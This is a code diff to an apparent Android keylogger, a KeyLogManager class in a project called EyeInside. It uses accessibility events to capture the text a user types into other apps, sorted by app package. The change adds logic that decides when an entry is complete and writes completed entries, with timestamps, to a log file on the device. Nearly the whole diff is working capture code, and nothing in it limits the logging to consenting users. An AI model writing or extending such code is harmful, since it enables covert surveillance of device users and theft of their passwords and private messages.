@@ -1,5 +1,10 @@
 package com.code4bones.EyeInside;
 
+import java.io.File;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.PrintStream;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.Map;
@@ -22,7 +27,7 @@ public class KeyLogManager {
 	
 	public Map<String,ArrayList<KeyLogObj>> mLog = new HashMap<String,ArrayList<KeyLogObj>>();
 	public KeyLogObj mCurrent = null;
-	
+	public String mFilePath;
 	
 	private static class HOLDER {
 		private static final KeyLogManager INSTANCE = new KeyLogManager();
@@ -36,6 +41,7 @@ public class KeyLogManager {
 		NetLog.v("KeyLogManager created");
 	}
 
+	
 	public void handleEvent(AccessibilityEvent event) {
 		String packageName = event.getPackageName().toString();
 		String className = event.getClassName().toString();
@@ -53,14 +59,40 @@ public class KeyLogManager {
 		} 
 	}
 	
+	public void closeIfNeeded(String packageName,String clazz,String text,boolean click) {
+		if ( mCurrent != null ) {
+			if ( mCurrent.compareAvg(text) > 25 ) {
+				NetLog.v("Close: %s->%s",mCurrent.mText,text);
+				mCurrent.mComplete = true;
+				mCurrent = null;
+				try {
+					dump();
+				} catch (IOException e) {
+					// TODO Auto-generated catch block
+					e.printStackTrace();
+				}
+				if ( click && text.length() > 0 ) {
+					ArrayList<KeyLogObj> list = mLog.get(packageName);
+					if ( list == null ) {
+						list = new ArrayList<KeyLogObj>();
+						mLog.put(packageName, list);
+					}
+					KeyLogObj log = new KeyLogObj(clazz,text);
+					log.mComplete = true;
+					list.add(log);
+				}
+			} else {
+				NetLog.v("DONT CLOSE: %s->%s",mCurrent.mText,text);
+			}
+		}
+	}
+	
 	public void handleFocused(String packageName,String clazz,String text) {
-		//NetLog.v("Focus: %s(%s):%s",packageName,clazz,text);
-		mCurrent = null;
+		closeIfNeeded(packageName,clazz,text,false);
 	}
 	
 	public void handleClicked(String packageName,String clazz,String text) {
-		//NetLog.v("Clicked: %s(%s):%s",packageName,clazz,text);
-		mCurrent = null;
+		closeIfNeeded(packageName,clazz,text,true);
 	}
 	
 	public void handleChanged(String packageName,String clazz,String text) {
@@ -92,7 +124,7 @@ public class KeyLogManager {
 	public KeyLogObj findActiveLog(String packageName,String clazz,String text) {
 		ArrayList<KeyLogObj> list = mLog.get(packageName);
 		for ( KeyLogObj log : list ) {
-			if ( log.isEqual(clazz,text) ) {
+			if ( !log.mComplete && log.isEqual(clazz,text) ) {
 				return log;
 			}
 		}
@@ -105,14 +137,27 @@ public class KeyLogManager {
 	}
 	
 	
-	public void dump() {
+	public void dump() throws IOException {
+		File file = new File(mFilePath);
+		FileOutputStream fos = new FileOutputStream(file,true);
+		PrintStream ps = new PrintStream(fos);
 		Set<String> keys = mLog.keySet();
 		for ( String key : keys.toArray(new String[]{})) {
-			NetLog.v("PACKAGE: %s", key);
 			ArrayList<KeyLogObj> list = mLog.get(key);
+			if ( list.isEmpty() )
+				continue;
+			ArrayList<KeyLogObj> remove = new ArrayList<KeyLogObj>();
+			ps.printf("PACKAGE: %s\r\n", key);
 			for ( KeyLogObj log : list ) {
-				NetLog.v("-->%s",log.mText);
+				if ( log.mComplete ) {
+					ps.printf("[%s] %s\r\n",log.mDate.toLocaleString(),log.mText);
+					remove.add(log);
+				}
 			}
+			NetLog.v("Flush %d objects",remove.size());
+			list.removeAll(remove);
 		}
+		ps.close();
+		fos.close();
 	}
 }
